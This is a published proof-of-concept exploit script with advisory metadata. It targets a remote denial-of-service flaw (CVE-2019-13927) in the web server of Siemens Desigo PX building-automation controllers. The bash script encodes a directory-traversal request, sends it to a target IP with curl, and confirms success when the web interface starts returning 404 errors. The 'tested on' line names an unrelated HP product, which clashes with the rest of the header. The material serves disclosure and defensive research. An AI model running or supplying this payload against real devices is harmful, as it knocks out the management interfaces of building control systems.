# Title: Siemens Desigo PX 6.00 - Denial of Service (PoC)
# Author: LiquidWorm
# Date: 2019-11-14
# Vendor web page: https://www.siemens.com
# Product web page: https://new.siemens.com/global/en/products/buildings/automation/desigo.html
# Affected version:6.00
# Affected version: Model: PXC00-E.D, PXC50-E.D, PXC100-E.D, PXC200-E.D
#                   With Desigo PX Web modules: PXA40-W0, PXA40-W1, PXA40-W2
#                   All firmware versions < V6.00.320
#                   ------
#                   Model: PXC00-U, PXC64-U, PXC128-U
#                   With Desigo PX Web modules: PXA30-W0, PXA30-W1, PXA30-W2
#                   All firmware versions < V6.00.320
#                   ------
#                   Model: PXC22.1-E.D, PXC36-E.D, PXC36.1-E.D
#                   With activated web server
#                   All firmware versions < V6.00.320
# CVE: N/A
# Advisory ID: ZSL-2019-5542
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5542.php

#!/bin/bash
#
#
# Siemens Desigo PX V6.00 Web Remote Denial of Service Exploit
#
#
# Vendor: Siemens AG
# Vendor web page: https://www.siemens.com
# Product web page: https://new.siemens.com/global/en/products/buildings/automation/desigo.html

#
# Summary: Desigo PX is a modern building automation and control
# system for the entire field of building service plants. Scalable
# from small to large projects with highest degree of energy efficiency,
# openness and user-friendly operation.
#
# Desc: The device contains a vulnerability that could allow an attacker
# to cause a denial of service condition on the device's web server
# by sending a specially crafted HTTP message to the web server port
# (tcp/80). The security vulnerability could be exploited by an attacker
# with network access to an affected device. Successful exploitation
# requires no system privileges and no user interaction. An attacker
# could use the vulnerability to compromise the availability of the
# device's web service. While the device itself stays operational, the
# web server responds with HTTP status code 404 (Not found) to any further
# request. A reboot is required to recover the web interface.
#
# Tested on: HP StorageWorks MSL4048 httpd
#
# ================================================================================
# Expected result after sending the directory traversal sequence: /dir?dir=../../:
# --------------------------------------------------------------------------------
#
# $ curl http://10.0.0.17/index.htm
# <HEAD><TITLE>404 Not Found</TITLE></HEAD>
# <BODY><H1>404 Not Found</H1>
# Url '/INDEX.HTM' not found on server<P>
# </BODY>
#
# ================================================================================
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
# Zero Science Lab - https://www.zeroscience.mk
# @zeroscience
#
#

#
# Vendor ID: SSA-898181
# Vendor Fix: https://support.industry.siemens.com/cs/document/109772802
# Vendor Advisory PDF: https://cert-portal.siemens.com/productcert/pdf/ssa-898181.pdf
# Vendor Advisory TXT: https://cert-portal.siemens.com/productcert/txt/ssa-898181.txt
# Vendor ACK: https://new.siemens.com/global/en/products/services/cert/hall-of-thanks.html
#
# CWE ID: CWE-472: External Control of Assumed-Immutable Web Parameter
# CWE URL: https://cwe.mitre.org/data/definitions/472.html
# CVE ID: CVE-2019-13927
# CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13927
# CVSS v3.1 Base Score: 5.3
# CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:H/RL:O/RC:C
#
#
# 06.06.2019
#


echo -ne "\n----------------------------------"
echo -ne "\nSiemens Desigo PX HTTP Web RMI DoS"
echo -ne "\n----------------------------------\n"
if [ "$#" -ne 1 ]; then
	echo -ne "\nUsage: $0 [ipaddr]\n\n"
	exit
fi
IP=$1
TARGET="http://$IP/"
PAYLOAD=`echo -ne "\x64\x69\x72\x3f\x64\x69\x72\x3d\x2e\x2e\x2f\x2e\x2e\x2f"`
echo -ne "\n[+] Sending payload to $IP on port 80."
curl -s "$TARGET$PAYLOAD" > /dev/null
echo -ne "\n[*] Done"
echo -ne "\n[+] Checking if exploit was successful..."
status=$(curl -Is http://$IP/index.htm 2>/dev/null | head -1 | awk -F" " '{print $2}')
if [ "$status" == "404" ]; then
	echo -ne "\n[*] Exploit successful!\n"
else
	echo -ne "\n[-] Exploit unsuccessful.\n"
	exit
fi